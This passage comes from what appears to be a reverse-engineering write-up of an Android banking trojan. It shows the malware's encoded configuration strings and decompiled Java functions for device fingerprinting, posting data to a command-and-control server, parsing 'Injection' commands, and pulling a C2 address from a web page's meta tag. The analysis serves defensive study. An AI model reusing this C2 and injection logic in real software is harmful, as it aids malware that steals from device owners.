    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"ull1"</span><span class="o">&gt;</span><span class="nc">Rm9yY2Ugc3RvcA</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"ull2"</span><span class="o">&gt;</span><span class="n">dG8gcmVtb3Zl</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"lowbattery"</span><span class="o">&gt;</span><span class="nc">TG93IEJhdHRlcnk</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"xau"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"cdm"</span><span class="o">&gt;</span><span class="n">reee</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"opo"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"toast"</span><span class="o">&gt;</span><span class="nc">UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiBmb3IgdGhlIGFwcGxpY2F0aW9uIHRvIHJ1bi4</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"dsd"</span><span class="o">&gt;</span><span class="n">none</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"boa"</span><span class="o">&gt;</span><span class="nc">QWxsb3c</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"btry"</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"device"</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"accs"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"psd"</span><span class="o">&gt;</span><span class="n">falsefalse</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"allow"</span><span class="o">&gt;</span><span class="nc">QWxsb3c</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"rbt"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"fss"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"aduration"</span><span class="o">&gt;</span><span class="mi">1500</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"locale"</span><span class="o">&gt;</span><span class="n">en</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"sb"</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"duration"</span><span class="o">&gt;</span><span class="mi">500</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"titlex"</span><span class="o">&gt;</span><span class="nc">SW5mb3JtYXRpb24</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"bs"</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"smm"</span><span class="o">&gt;</span><span class="mi">13</span> <span class="no">A50</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"forwading"</span><span class="o">&gt;</span><span class="nc">Y29tLmxtci5sZm0</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"min"</span><span class="o">&gt;</span><span class="n">zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ</span><span class="o">/</span><span class="nc">FWvMgQ</span><span class="o">==&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"ka"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"logsender"</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"onb"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"restart"</span><span class="o">&gt;</span><span class="n">cmVzdGFydA</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"ullh"</span><span class="o">&gt;</span><span class="nc">Rk9SQ0UgU1RPUA</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"sy"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"infobig"</span><span class="o">&gt;</span><span class="nc">UGxlYXNlIGdyYW50IHRoZSBwZXJtaXNzaW9uIHNob3duIGFib3ZlIGZvciB0aGUgYXBwbGljYXRpb24gdG8gcnVuLg</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"again"</span><span class="o">&gt;</span><span class="nc">UGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"ntr"</span><span class="o">&gt;</span><span class="kc">true</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"ullp"</span><span class="o">&gt;</span><span class="nc">Rm9yY2Ugc3RvcA</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"ky"</span><span class="o">&gt;</span><span class="mi">0</span><span class="n">hh2fpkr5zt72</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"permistoast"</span><span class="o">&gt;</span><span class="nc">WW91IGNhbm5vdCB1c2UgdGhlIGFwcGxpY2F0aW9uIHdpdGhvdXQgZ2l2aW5nIHRoZSBuZWNlc3NhcnkgcGVybWlzc2lvbi4</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"aso"</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 
    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"pl"</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span> 

<span class="o">&lt;/</span><span class="n">map</span><span class="o">&gt;</span> 
</code></pre></div></div>

<p>Analyzing the wide variety of data, a question was asked: What are these strings? What are they used for?</p>

<p>The main functions involved in reading and writing Shared Preference are Bedamend and Sandrakottos:</p>

<h4 id="bedamned">Bedamned</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img12.png" alt="Figure 12 - Bedamned Class" /></p>

<p>The function retrives data from SharedPreference: 
Opens the sharedpreference called “app” (app.xml) and return the string associated with key n from the SharedPreferences.</p>

<p>If the key does not exist, it returns a default value.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
   <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">bedamned</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">String</span> <span class="n">n</span><span class="o">)</span> <span class="o">{</span> 
        <span class="nc">SharedPreferences</span> <span class="n">s</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getSharedPreferences</span><span class="o">((</span><span class="s">"app"</span><span class="o">);</span> 
        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">n</span><span class="o">,</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">);</span> 
    <span class="o">}</span> 


</code></pre></div></div>

<h4 id="sandrakottos">Sandrakottos</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img13.png" alt="Figure 13 - Sandrakottos Class" /></p>

<p>The function writes data to shared preference, inserts the key-value paur (n,p) into the SharedPreferences</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
     <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">Sandrakottos</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">String</span> <span class="n">n</span><span class="o">,</span> <span class="nc">String</span> <span class="n">p</span><span class="o">)</span> <span class="o">{</span> 

        <span class="nc">SharedPreferences</span> <span class="n">s</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getSharedPreferences</span><span class="o">((</span><span class="s">"app"</span><span class="o">),</span> <span class="mi">0</span><span class="o">);</span> 

        <span class="nc">SharedPreferences</span><span class="o">.</span><span class="na">Editor</span> <span class="n">e</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">edit</span><span class="o">();</span> 

        <span class="n">e</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="n">n</span><span class="o">,</span> <span class="n">p</span><span class="o">);</span> 

        <span class="n">e</span><span class="o">.</span><span class="na">apply</span><span class="o">();</span> 

    <span class="o">}</span> 
</code></pre></div></div>

<p>Having found the function that read and write the share preferences, it was possibile to proceed to the examination of the main functions that write and read data from the shared Preferences:</p>

<h4 id="champaka">Champaka</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img14.png" alt="Figure 14 - Champaka Class" /></p>

<p>The function generates a random string, which will then be used as the identifier of the device on which the malware is installed, to communicate with the c2 (we will see in the appropriate section).
The function take the length of the string “a” as parameter.
The created string will contain numbers from 0 to 9 and lowercase letters from a to z without w and x.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
   <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">champaka</span><span class="o">(</span><span class="kt">int</span> <span class="n">l</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">a</span> <span class="o">=</span> <span class="o">(</span><span class="s">"0123456789"</span><span class="o">)+(</span><span class="s">"abcdefghijklmpqrstuvyz"</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">();</span>
        <span class="nc">StringBuilder</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">(</span><span class="n">l</span><span class="o">);</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">l</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
            <span class="kt">int</span> <span class="n">in</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="o">(</span><span class="n">a</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">*</span> <span class="nc">Math</span><span class="o">.</span><span class="na">random</span><span class="o">());</span>
            <span class="n">s</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">a</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">in</span><span class="o">));</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
    <span class="o">}</span>

</code></pre></div></div>

<h4 id="undissuadably">Undissuadably</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img15.png" alt="Figure 15 - Undissuadably Class" /></p>

<p>It Initializes an OkHttpClient  object with different timeouts, constructs a FormBody using the parameters provided in the HashMap. Creates and sends HTTP POST request with the parameters.
If the response is valid and contains the string “Injection”,it  processes the response further, splits the result and invokes several functions, some of which appears to store values in SharedPreferences. Then it stores the result in the “obtainal” key.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">undissuadably</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">String</span> <span class="n">url</span><span class="o">,</span> <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">String</span><span class="o">&gt;</span> <span class="n">params</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">fiddlebow</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">OkHttpClient</span><span class="o">();</span>
        <span class="nc">OkHttpClient</span><span class="o">.</span><span class="na">Builder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">OkHttpClient</span><span class="o">.</span><span class="na">Builder</span><span class="o">();</span>
        <span class="nc">TimeUnit</span> <span class="n">timeUnit</span> <span class="o">=</span> <span class="nc">TimeUnit</span><span class="o">.</span><span class="na">SECONDS</span><span class="o">;</span>
        <span class="n">fiddlebow</span> <span class="o">=</span> <span class="n">builder</span>
            <span class="o">.</span><span class="na">connectTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">)</span>
            <span class="o">.</span><span class="na">writeTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">)</span>
            <span class="o">.</span><span class="na">readTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">)</span>
            <span class="o">.</span><span class="na">callTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">)</span>
            <span class="o">.</span><span class="na">build</span><span class="o">();</span>
        
        <span class="kd">final</span> <span class="nc">FormBody</span><span class="o">.</span><span class="na">Builder</span> <span class="n">builder2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormBody</span><span class="o">.</span><span class="na">Builder</span><span class="o">();</span>
        <span class="n">nonstylized</span> <span class="o">=</span> <span class="n">builder2</span><span class="o">;</span>
        <span class="nc">Objects</span><span class="o">.</span><span class="na">requireNonNull</span><span class="o">(</span><span class="n">builder2</span><span class="o">);</span>
        
        <span class="n">params</span><span class="o">.</span><span class="na">forEach</span><span class="o">(</span><span class="k">new</span> <span class="nc">BiConsumer</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">String</span><span class="o">&gt;()</span> <span class="o">{</span>
            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">accept</span><span class="o">(</span><span class="nc">String</span> <span class="n">key</span><span class="o">,</span> <span class="nc">String</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">builder2</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">});</span>
        
        <span class="n">spekboom</span> <span class="o">=</span> <span class="n">nonstylized</span><span class="o">.</span><span class="na">build</span><span class="o">();</span>
        
        <span class="nc">Request</span> <span class="n">build</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Request</span><span class="o">.</span><span class="na">Builder</span><span class="o">()</span>
            <span class="o">.</span><span class="na">addHeader</span><span class="o">(</span><span class="s">"Content-Type"</span><span class="o">,</span> <span class="s">"text/plain; charset=utf-8"</span><span class="o">)</span>
            <span class="o">.</span><span class="na">addHeader</span><span class="o">(</span><span class="s">"Connection"</span><span class="o">,</span> <span class="s">"close"</span><span class="o">)</span>
            <span class="o">.</span><span class="na">url</span><span class="o">(</span><span class="n">url</span><span class="o">)</span>
            <span class="o">.</span><span class="na">post</span><span class="o">(</span><span class="n">spekboom</span><span class="o">)</span>
            <span class="o">.</span><span class="na">build</span><span class="o">();</span>
        
        <span class="nc">Custer</span> <span class="o">=</span> <span class="n">build</span><span class="o">;</span>
        
        <span class="n">fiddlebow</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="n">build</span><span class="o">).</span><span class="na">enqueue</span><span class="o">(</span><span class="k">new</span> <span class="nc">Callback</span><span class="o">()</span> <span class="o">{</span>
            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onFailure</span><span class="o">(</span><span class="nc">Call</span> <span class="n">call</span><span class="o">,</span> <span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="o">}</span>
 
            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onResponse</span><span class="o">(</span><span class="nc">Call</span> <span class="n">call</span><span class="o">,</span> <span class="nc">Response</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
                <span class="nc">String</span> <span class="n">effluvias</span> <span class="o">=</span> <span class="s">"cn"</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">isSuccessful</span><span class="o">())</span> <span class="o">{</span>
                    <span class="k">try</span> <span class="o">{</span>
                        <span class="nc">String</span> <span class="n">res</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">body</span><span class="o">().</span><span class="na">string</span><span class="o">();</span>
                        <span class="n">veepees</span><span class="o">.</span><span class="na">obtainal</span> <span class="o">=</span> <span class="n">res</span><span class="o">;</span>
                        <span class="k">try</span> <span class="o">{</span>
                            <span class="k">if</span> <span class="o">(!</span><span class="n">res</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
                                <span class="n">veepees</span><span class="o">.</span><span class="na">obtainal</span> <span class="o">=</span> <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Uriiah</span><span class="o">(</span><span class="n">res</span><span class="o">);</span>
                            <span class="o">}</span>
                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                        <span class="o">}</span>
                        <span class="k">if</span> <span class="o">(!</span><span class="nc">Tamarix</span><span class="o">.</span><span class="na">bedamned</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">effluvias</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="n">veepees</span><span class="o">.</span><span class="na">obtainal</span><span class="o">))</span> <span class="o">{</span>
                            <span class="k">if</span> <span class="o">(</span><span class="n">veepees</span><span class="o">.</span><span class="na">obtainal</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"Injection"</span><span class="o">))</span> <span class="o">{</span>
                                <span class="nc">String</span><span class="o">[]</span> <span class="n">split</span> <span class="o">=</span> <span class="n">veepees</span><span class="o">.</span><span class="na">obtainal</span><span class="o">.</span><span class="na">trim</span><span class="o">().</span><span class="na">split</span><span class="o">(</span><span class="s">":"</span><span class="o">);</span>
                                <span class="n">veepees</span><span class="o">.</span><span class="na">tautologys</span> <span class="o">=</span> <span class="n">split</span><span class="o">;</span>
                                <span class="k">try</span> <span class="o">{</span>
                                    <span class="n">rawedged</span><span class="o">.</span><span class="na">runtiest</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">split</span><span class="o">[</span><span class="mi">8</span><span class="o">]);</span>
                                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>
                                <span class="o">}</span>
                                <span class="k">try</span> <span class="o">{</span>
                                    <span class="n">rawedged</span><span class="o">.</span><span class="na">reexpressing</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">veepees</span><span class="o">.</span><span class="na">tautologys</span><span class="o">[</span><span class="mi">11</span><span class="o">]);</span>
                                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e3</span><span class="o">)</span> <span class="o">{</span>
                                <span class="o">}</span>
                                <span class="k">try</span> <span class="o">{</span>
                                    <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"dsd"</span><span class="o">,</span> <span class="n">veepees</span><span class="o">.</span><span class="na">tautologys</span><span class="o">[</span><span class="mi">13</span><span class="o">]);</span>
                                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e4</span><span class="o">)</span> <span class="o">{</span>
                                <span class="o">}</span>
                                <span class="k">try</span> <span class="o">{</span>
                                    <span class="nc">Context</span> <span class="n">context2</span> <span class="o">=</span> <span class="n">context</span><span class="o">;</span>
                                    <span class="nc">String</span><span class="o">[]</span> <span class="n">strArr</span> <span class="o">=</span> <span class="n">veepees</span><span class="o">.</span><span class="na">tautologys</span><span class="o">;</span>
                                    <span class="n">rawedged</span><span class="o">.</span><span class="na">hyperemetic</span><span class="o">(</span><span class="n">context2</span><span class="o">,</span> <span class="n">strArr</span><span class="o">[</span><span class="mi">14</span><span class="o">],</span> <span class="n">strArr</span><span class="o">[</span><span class="mi">15</span><span class="o">]);</span>
                                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e5</span><span class="o">)</span> <span class="o">{</span>
                                <span class="o">}</span>
                                <span class="k">try</span> <span class="o">{</span>
                                    <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"psd"</span><span class="o">,</span> <span class="n">veepees</span><span class="o">.</span><span class="na">tautologys</span><span class="o">[</span><span class="mi">22</span><span class="o">]);</span>
                                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e6</span><span class="o">)</span> <span class="o">{</span>
                                <span class="o">}</span>
                                <span class="k">try</span> <span class="o">{</span>
                                    <span class="nc">Besant</span><span class="o">.</span><span class="na">sublibrarianship</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">veepees</span><span class="o">.</span><span class="na">tautologys</span><span class="o">[</span><span class="mi">21</span><span class="o">]);</span>
                                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e7</span><span class="o">)</span> <span class="o">{</span>
                              
                                <span class="o">}</span>
                                <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"is"</span><span class="o">,</span> <span class="n">veepees</span><span class="o">.</span><span class="na">tautologys</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
                            <span class="o">}</span>
                            <span class="nc">Tamarix</span><span class="o">.</span><span class="na">Sandrakottos</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">effluvias</span><span class="o">,</span> <span class="n">res</span><span class="o">);</span>
                        <span class="o">}</span>
                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e8</span><span class="o">)</span> <span class="o">{</span>
                 
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">});</span>
        <span class="k">return</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">FRAGMENT_ENCODE_SET</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>


</code></pre></div></div>

<h4 id="spellican">Spellican</h4>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img16.png" alt="Figure 16 - Spellican Class" /></p>

<p>This function creates an OkHttpClient.Builder. 
It configures the timeouts for connect, write, read, and total call to 50 seconds each.
Convert the response body to a string using a regex to search for a specific meta tag with property=”og:description” and capture the contents of the tag.
For each occurrence found by the regex, call the Sandrakottos method to save the content in the SharedPreferences under the key “min”.</p>

<p><img src="/assets/images/2024-12-09-godfather-android-analysis/img17.png" alt="Figure 17 - SharedPreference Reference" /> 
Which, in fact, turns out to be the C2 string analyzed earlier.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">spellican</span><span class="o">(</span><span class="nc">String</span> <span class="n">url</span><span class="o">,</span> <span class="nc">Context</span> <span class="n">context</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
        <span class="nc">OkHttpClient</span><span class="o">.</span><span class="na">Builder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">OkHttpClient</span><span class="o">.</span><span class="na">Builder</span><span class="o">();</span>
        <span class="nc">TimeUnit</span> <span class="n">timeUnit</span> <span class="o">=</span> <span class="nc">TimeUnit</span><span class="o">.</span><span class="na">SECONDS</span><span class="o">;</span>
        <span class="nc">OkHttpClient</span> <span class="n">client</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">connectTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">).</span><span class="na">writeTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">).</span><span class="na">readTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">).</span><span class="na">callTimeout</span><span class="o">(</span><span class="mi">50L</span><span class="o">,</span> <span class="n">timeUnit</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
        <span class="nc">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Request</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">url</span><span class="o">(</span><span class="n">url</span><span class="o">).</span><span class="na">addHeader</span><span class="o">((</span><span class="s">"User-Agent"</span><span class="o">),</span> <span class="o">(</span><span class="s">"Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36"</span><span class="o">)).</span><span class="na">build</span><span class="o">();</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="n">request</span><span class="o">).</span><span class="na">execute</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(!</span><span class="n">response</span><span class="o">.</span><span class="na">isSuccessful</span><span class="o">())</span> <span class="o">{</span>
